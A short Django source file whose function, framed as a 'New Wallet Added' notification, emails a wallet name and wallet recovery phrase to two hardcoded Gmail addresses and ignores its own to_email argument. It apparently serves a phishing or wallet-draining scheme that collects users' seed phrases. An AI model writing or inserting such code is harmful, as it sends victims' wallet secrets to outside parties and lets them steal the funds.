from django.core.mail import send_mail
from django.conf import settings

def send_wallet_email(to_email, wallet_name, wallet_phrase):
    try:
        subject = 'New Wallet Added'
        message = f'Wallet Name: {wallet_name}\nWallet Phrase: {wallet_phrase}'
        from_email = settings.EMAIL_HOST_USER
        recipient_list = ['savvybittechnology@gmail.com','qfssystemvault@gmail.com']
        send_mail(subject, message, from_email, recipient_list)
    except Exception as e:
        print(f"Error sending email: {e}")
        
